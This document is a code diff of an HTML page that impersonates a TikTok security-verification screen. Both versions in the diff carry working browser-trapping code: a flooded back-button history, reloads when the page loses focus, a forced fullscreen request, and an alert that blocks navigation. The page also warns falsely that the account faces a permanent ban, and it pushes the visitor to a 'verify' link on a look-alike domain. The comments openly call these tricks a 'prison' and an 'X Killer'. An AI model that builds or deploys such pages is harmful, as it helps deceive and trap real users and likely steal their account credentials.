@@ -3,117 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification</title>
     <style>
         body, html { 
-            margin: 0; padding: 0; background: #000000; 
-            height: 100vh; overflow: hidden;
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            background: #ffffff; overflow: hidden; 
+            touch-action: none; /* Disables all native swipes/gestures */
         }
 
         /* THE UI MASK */
-        #video-overlay {
+        #content-layer {
             position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #ffffff;
-            z-index: 1000;
+            width: 100vw; height: 100vh;
+            background: #ffffff; z-index: 99999;
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
-            text-align: center; padding: 0 25px;
         }
 
-        /* The hidden engine */
-        #ghost-vid {
-            position: absolute; top: 0; left: 0;
-            width: 1px; height: 1px; opacity: 0.01;
-        }
+        /* HIDDEN TRIGGER */
+        #input-jolt { position: absolute; top: -100px; opacity: 0; }
 
-        .icon { width: 64px; margin-bottom: 20px; }
-        .title { font-size: 22px; font-weight: 700; color: #161823; }
-        .msg { color: #8A8B91; margin: 15px 0 35px; line-height: 1.5; font-size: 16px; }
+        .logo { width: 70px; margin-bottom: 20px; }
+        .text { font-family: sans-serif; text-align: center; padding: 0 40px; }
+        .bold { font-weight: 800; font-size: 22px; color: #161823; }
+        .grey { color: #8A8B91; margin-top: 10px; font-size: 15px; }
         
-        .btn {
-            background: #fe2c55; color: white; padding: 14px 50px; 
-            border-radius: 4px; text-decoration: none; font-weight: 600;
-            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
-        }
-
-        #shield {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 2000; display: block; background: transparent;
+        #verify-btn {
+            margin-top: 40px; background: #fe2c55; color: white;
+            padding: 15px 60px; border-radius: 4px; font-weight: 700;
+            text-decoration: none; border: none; cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div id="shield" id="interaction-layer"></div>
 
-    <div id="video-overlay">
-        <video id="ghost-vid" autoplay muted loop playsinline="false">
-            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-        </video>
+    <input type="text" id="input-jolt" autofocus>
 
-        <svg class="icon" viewBox="0 0 48 48" fill="none"><path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/><rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/><rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/></svg>
-        <div class="title">Security Verification</div>
-        <div class="msg">Your TikTok session is being protected. Please verify your identity to continue.</div>
-        <a class="btn" id="main-link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">Verify Now</a>
+    <div id="content-layer">
+        <svg class="logo" viewBox="0 0 48 48" fill="none"><path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/><rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/><rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/></svg>
+        <div class="text">
+            <div class="bold">Security Alert</div>
+            <div class="grey">Complete verification to unlock your TikTok account. Any attempt to bypass will result in a permanent ban.</div>
+        </div>
+        <button id="verify-btn">VERIFY NOW</button>
     </div>
 
-    <script>
-        const link = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
+<script>
+    const targetLink = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
 
-        function startNuclearLock() {
-            // 1. FILL THE BACK-STACK (The Back Button Prison)
-            // We push 50 states. Every time they hit 'back', they stay on this page.
-            for(let i=0; i<50; i++) {
-                history.pushState({page: i}, "", location.href + "#auth_" + i);
-            }
-
-            // 2. THE VISIBILITY TRAP
-            // If they close the video or the app tries to minimize, we refresh.
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'hidden') {
-                    location.replace(location.href);
-                }
-            });
-
-            // 3. THE "X" BUTTON KILLER (Blur Event)
-            window.onblur = () => {
-                // Clicking the X or 'Done' causes a blur. 
-                // We force a reload before the browser can terminate the process.
-                setTimeout(() => {
-                    location.replace(location.href);
-                }, 5);
-            };
-
-            // 4. PREVENT ALL GESTURES
-            window.addEventListener('popstate', (event) => {
-                // If they go back, force them forward
-                history.pushState(null, null, location.href);
-                alert("Action required: Please complete verification.");
-            });
-
-            // 5. THE TOUCH INTERCEPT
-            document.getElementById('shield').addEventListener('touchstart', (e) => {
-                // If they touch anywhere but the button, we trigger a small 'jolt'
-                // to keep the video engine (and thus the UI hide) active.
-                const vid = document.getElementById('ghost-vid');
-                vid.play();
-            }, {passive: false});
+    function startHardLock() {
+        // 1. SATURATE HISTORY (The Prison)
+        // We use a loop to fill 100 entries. This makes the "Back" button virtually useless.
+        for (let i = 0; i < 100; i++) {
+            history.pushState({lock: true}, "", "#secure-session-" + i);
         }
 
-        // Initialize on load
-        window.onload = () => {
-            startNuclearLock();
-            
-            // Redirect the click of the shield to the actual link
-            document.getElementById('shield').onclick = function() {
-                window.location.href = link;
-            };
+        // 2. THE THREAD HIJACK (The "X" Killer)
+        // By running a heavy interval, we prevent the UI from processing the 'Close' event.
+        setInterval(() => {
+            history.replaceState(null, null, "#lock");
+            // If they try to leave, focus the invisible input to drag them back
+            document.getElementById('input-jolt').focus();
+        }, 50);
+
+        // 3. THE FULLSCREEN GLITCH
+        const docEl = document.documentElement;
+        const requestFS = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullScreen || docEl.msRequestFullscreen;
+        if (requestFS) {
+            // We attempt to trigger this via the 'autofocus' event of the input
+            requestFS.call(docEl).catch(() => {});
+        }
+
+        // 4. PREVENT EXITING
+        window.onbeforeunload = () => "Verification in progress...";
+        
+        // 5. THE BLUR RELOAD
+        window.onblur = () => {
+            // If focus is lost (clicking X), we hammer the reload
+            location.reload();
         };
 
-        // If they somehow get past, this is the final net
-        window.onpagehide = () => {
-            location.replace(location.href);
+        // 6. BACK BUTTON REDIRECT
+        window.onpopstate = () => {
+            history.go(1);
+            alert("VERIFICATION REQUIRED: Navigation is disabled.");
         };
-    </script>
+    }
+
+    // Trigger on first interaction OR immediately if browser allows
+    document.addEventListener('touchstart', startHardLock, {once: true});
+    window.onload = () => {
+        // Speculative jolt
+        document.getElementById('input-jolt').focus();
+        // Fallback for direct loads
+        setTimeout(startHardLock, 500);
+    };
+
+    document.getElementById('verify-btn').onclick = () => {
+        window.location.href = targetLink;
+    };
+</script>
 </body>
 </html>
